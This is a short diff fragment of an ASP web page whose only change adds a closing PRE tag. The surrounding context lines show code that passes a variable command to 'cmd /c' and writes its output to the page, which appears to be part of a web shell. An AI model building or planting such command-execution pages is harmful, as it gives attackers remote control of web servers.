@@ -48,5 +48,6 @@ thisDir = getCommandOutput("cmd /c" & szCMD)
 Response.Write(thisDir)%>
 </p>
 <br>
+</PRE>
 </BODY>
 </HTML>
